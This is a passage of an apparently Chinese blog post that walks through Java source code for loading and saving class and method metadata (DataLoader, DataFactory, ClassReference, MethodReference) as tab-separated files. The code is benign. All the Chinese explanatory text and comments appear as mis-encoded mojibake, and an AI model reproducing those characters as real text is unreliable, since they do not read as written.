DataLoader</h3><p>å®šä¹‰äº†æ•°æ®çš„è¯»å†™æ–¹å¼ï¼Œæ ¹æ®æ•°æ®å·¥å‚æ–¹æ³•ï¼ˆDataFactoryï¼‰è¿›è¡Œè¯»å†™ï¼Œ<code>loadData</code> è¿”å›çš„æ˜¯åŠ¨æ€æ•°ç»„ï¼Œæºç ä¸­å¤šå¤„è°ƒç”¨è¿›è¡Œæ•°æ®éå†ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * æ ¹æ®æ•°æ®å·¥å‚æ¥å£è§£ææ•°æ®åˆ°å¯¹è±¡</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> filePath æ–‡ä»¶è·¯å¾„</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> factory  å·¥å‚æ–¹æ³•</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &lt;T&gt;      ç±»å‹</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; List&lt;T&gt; <span class="title function_">loadData</span><span class="params">(Path filePath, DataFactory&lt;T&gt; factory)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">final</span> List&lt;String&gt; lines = Files.readLines(filePath.toFile(), StandardCharsets.UTF_8);</span><br><span class="line">    <span class="keyword">final</span> List&lt;T&gt; values = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;T&gt;(lines.size());</span><br><span class="line">    <span class="keyword">for</span> (String line : lines) &#123;</span><br><span class="line">        values.add(factory.parse(line.split(<span class="string">&quot;\t&quot;</span>, -<span class="number">1</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> values;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * æ ¹æ®æ•°æ®å·¥å‚æ¥å£å°†æ•°æ®å†™å…¥æ–‡ä»¶</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> filePath æ–‡ä»¶è·¯å¾„</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> factory  å·¥å‚æ–¹æ³•</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> values   å¾…å†™å…¥çš„æ•°æ®</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &lt;T&gt;      ç±»å‹</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="keyword">void</span> <span class="title function_">saveData</span><span class="params">(Path filePath, DataFactory&lt;T&gt; factory, Collection&lt;T&gt; values)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">try</span> (<span class="type">BufferedWriter</span> <span class="variable">writer</span> <span class="operator">=</span> Files.newWriter(filePath.toFile(), StandardCharsets.UTF_8)) &#123;</span><br><span class="line">        <span class="keyword">for</span> (T value : values) &#123;</span><br><span class="line">            <span class="keyword">final</span> String[] fields = factory.serialize(value);</span><br><span class="line">            <span class="keyword">if</span> (fields == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">            <span class="keyword">for</span> (String field : fields) &#123;</span><br><span class="line">                <span class="keyword">if</span> (field == <span class="literal">null</span>) &#123;</span><br><span class="line">                    sb.append(<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    sb.append(<span class="string">&quot;\t&quot;</span>).append(field);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            writer.write(sb.substring(<span class="number">1</span>));</span><br><span class="line">            writer.write(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶ååˆ©ç”¨ä¸Šé¢çš„æ–¹æ³•å®ç°è¯»å–ç±»ä¿¡æ¯ï¼ˆclasses.datï¼‰å’Œæ–¹æ³•ä¿¡æ¯ï¼ˆmethods.datï¼‰ï¼Œè¿”å›å­˜å‚¨é”®å€¼çš„ Mapï¼Œæºç ä¸­å¤šæ¬¡è°ƒç”¨ç”¨äºæœç´¢ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ä» classes.dat åŠ è½½ç±»ä¿¡æ¯</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map&lt;ClassReference.Handle, ClassReference&gt; loadClasses() &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Map&lt;ClassReference.Handle, ClassReference&gt; classMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (ClassReference classReference : loadData(Paths.get(<span class="string">&quot;classes.dat&quot;</span>), <span class="keyword">new</span> <span class="title class_">ClassReference</span>.Factory())) &#123;</span><br><span class="line">            classMap.put(classReference.getHandle(), classReference);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> classMap;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ä» methods.dat åŠ è½½æ–¹æ³•ä¿¡æ¯</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map&lt;MethodReference.Handle, MethodReference&gt; loadMethods() &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Map&lt;MethodReference.Handle, MethodReference&gt; methodMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (MethodReference methodReference : loadData(Paths.get(<span class="string">&quot;methods.dat&quot;</span>), <span class="keyword">new</span> <span class="title class_">MethodReference</span>.Factory())) &#123;</span><br><span class="line">            methodMap.put(methodReference.getHandle(), methodReference);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> methodMap;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-DataFactory"><a href="#2-DataFactory" class="headerlink" title="2. DataFactory"></a>2. DataFactory</h3><p>æ•°æ®å·¥å‚æ¥å£ï¼Œå®šä¹‰æ•°æ®çš„å­˜å‚¨æ ¼å¼ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">DataFactory</span>&lt;T&gt; &#123;</span><br><span class="line">    T <span class="title function_">parse</span><span class="params">(String[] fields)</span>;</span><br><span class="line">    String[] serialize(T obj);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-ClassReference"><a href="#3-ClassReference" class="headerlink" title="3. ClassReference"></a>3. ClassReference</h3><p>å®šä¹‰<strong>ç±»ä¿¡æ¯</strong>çš„æè¿°æ–¹å¼ï¼Œè¿™äº›ä¿¡æ¯å…·ä½“éƒ½ä½¿ç”¨ asm è®¿é—®è€…è®°å½•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClassReference</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String name;          <span class="comment">// ç±»å</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String superClass;    <span class="comment">// çˆ¶ç±»å</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String[] interfaces;  <span class="comment">// æ¥å£</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">boolean</span> isInterface;  <span class="comment">// æ˜¯å¦ä¸ºæ¥å£</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Member[] members;     <span class="comment">// å­—æ®µ/å±æ€§/æˆå‘˜</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Member</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> String name;                  <span class="comment">// åç§°</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> modifiers;                <span class="comment">// è®¿é—®ä¿®é¥°ç¬¦</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> ClassReference.Handle type;   <span class="comment">// æ‰€å±ç±»</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">Member</span><span class="params">(String name, <span class="type">int</span> modifiers, Handle type)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.name = name;</span><br><span class="line">            <span class="built_in">this</span>.modifiers = modifiers;</span><br><span class="line">            <span class="built_in">this</span>.type = type;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getModifiers</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> modifiers;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Handle <span class="title function_">getType</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> type;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ClassReference</span><span class="params">(String name, String superClass, String[] interfaces, <span class="type">boolean</span> isInterface, Member[] members)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.superClass = superClass;</span><br><span class="line">        <span class="built_in">this</span>.interfaces = interfaces;</span><br><span class="line">        <span class="built_in">this</span>.isInterface = isInterface;</span><br><span class="line">        <span class="built_in">this</span>.members = members;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getSuperClass</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> superClass;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String[] getInterfaces() &#123;</span><br><span class="line">        <span class="keyword">return</span> interfaces;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isInterface</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> isInterface;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Member[] getMembers() &#123;</span><br><span class="line">        <span class="keyword">return</span> members;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Handle <span class="title function_">getHandle</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Handle</span>(name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Handle</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> String name;  <span class="comment">// ç±»å</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">Handle</span><span class="params">(String name)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.name = name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span> == o) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">if</span> (o == <span class="literal">null</span> || getClass() != o.getClass()) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">            <span class="type">Handle</span> <span class="variable">handle</span> <span class="operator">=</span> (Handle) o;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> name != <span class="literal">null</span> ? name.equals(handle.name) : handle.name == <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> name != <span class="literal">null</span> ? name.hashCode() : <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®šä¹‰<strong>ç±»ä¿¡æ¯</strong>çš„è¯»å†™æ ¼å¼ï¼š<code>ç±»å çˆ¶ç±»å æ¥å£A,æ¥å£B,æ¥å£C æ˜¯å¦ä¸ºæ¥å£ å­—æ®µ1!å­—æ®µ1è®¿é—®æ ‡å¿—!å­—æ®µ1ç±»å‹!å­—æ®µ2!å­—æ®µ2è®¿é—®æ ‡å¿—!å­—æ®µ2ç±»å‹</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Factory</span> <span class="keyword">implements</span> <span class="title class_">DataFactory</span>&lt;ClassReference&gt; &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ClassReference <span class="title function_">parse</span><span class="params">(String[] fields)</span> &#123;</span><br><span class="line">        String[] interfaces;</span><br><span class="line">        <span class="keyword">if</span> (fields[<span class="number">2</span>].equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">            interfaces = <span class="keyword">new</span> <span class="title class_">String</span>[<span class="number">0</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            interfaces = fields[<span class="number">2</span>].split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        String[] memberEntries = fields[<span class="number">4</span>].split(<span class="string">&quot;!&quot;</span>);</span><br><span class="line">        Member[] members = <span class="keyword">new</span> <span class="title class_">Member</span>[memberEntries.length / <span class="number">3</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; members.length; i++) &#123;</span><br><span class="line">            members[i] = <span class="keyword">new</span> <span class="title class_">Member</span>(memberEntries[<span class="number">3</span> * i], Integer.parseInt(memberEntries[<span class="number">3</span> * i + <span class="number">1</span>]),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(memberEntries[<span class="number">3</span> * i + <span class="number">2</span>]));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ClassReference</span>(</span><br><span class="line">                fields[<span class="number">0</span>],</span><br><span class="line">                fields[<span class="number">1</span>].equals(<span class="string">&quot;&quot;</span>) ? <span class="literal">null</span> : fields[<span class="number">1</span>],</span><br><span class="line">                interfaces,</span><br><span class="line">                Boolean.parseBoolean(fields[<span class="number">3</span>]),</span><br><span class="line">                members);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String[] serialize(ClassReference obj) &#123;</span><br><span class="line">        String interfaces;</span><br><span class="line">        <span class="keyword">if</span> (obj.interfaces.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">StringBuilder</span> <span class="variable">interfacesSb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">            <span class="keyword">for</span> (String iface : obj.interfaces) &#123;</span><br><span class="line">                interfacesSb.append(<span class="string">&quot;,&quot;</span>).append(iface);</span><br><span class="line">            &#125;</span><br><span class="line">            interfaces = interfacesSb.substring(<span class="number">1</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            interfaces = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">members</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span> (Member member : obj.members) &#123;</span><br><span class="line">            members.append(<span class="string">&quot;!&quot;</span>).append(member.getName())</span><br><span class="line">                    .append(<span class="string">&quot;!&quot;</span>).append(Integer.toString(member.getModifiers()))</span><br><span class="line">                    .append(<span class="string">&quot;!&quot;</span>).append(member.getType().getName());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;</span><br><span class="line">                obj.name,</span><br><span class="line">                obj.superClass,</span><br><span class="line">                interfaces,</span><br><span class="line">                Boolean.toString(obj.isInterface),</span><br><span class="line">                members.length() == <span class="number">0</span> ? <span class="literal">null</span> : members.substring(<span class="number">1</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-MethodReference"><a href="#4-MethodReference" class="headerlink" title="4. MethodReference"></a>4. MethodReference</h3><p>å®šä¹‰<strong>æ–¹æ³•ä¿¡æ¯</strong>çš„æè¿°æ–¹å¼ï¼ŒåŒæ ·ä½¿ç”¨ asm è®¿é—®è€…è®°å½•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MethodReference</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> ClassReference.Handle classReference; <span class="comment">// æ‰€å±ç±»</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String name;                          <span class="comment">// æ–¹æ³•å</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String desc;                          <span class="comment">// æè¿°ç¬¦</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">boolean</span> isStatic;                     <span class="comment">// æ˜¯å¦ä¸ºé™æ€æ–¹æ³•</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MethodReference</span><span class="params">(ClassReference.Handle classReference, String name, String desc, <span class="type">boolean</span> isStatic)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.classReference = classReference;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.desc = desc;</span><br><span class="line">        <span class="built_in">this</span>.isStatic = isStatic;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> ClassReference.Handle <span class="title function_">getClassReference</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> classReference;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getDesc</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> desc;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isStatic</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> isStatic;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Handle <span class="title function_">getHandle</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Handle</span>(classReference, name, desc);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Handle</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> ClassReference.Handle classReference; <span class="comment">// æ‰€å±ç±»</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> String name;                          <span class="comment">// æ–¹æ³•å</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> String desc;                          <span class="comment">// æè¿°ç¬¦</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">Handle</span><span class="params">(ClassReference.Handle classReference, String name, String desc)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.classReference = classReference;</span><br><span class="line">            <span class="built_in">this</span>.name = name;</span><br><span class="line">            <span class="built_in">this</span>.desc = desc;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> ClassReference.Handle <span class="title function_">getClassReference</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> classReference;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> String <span class="title 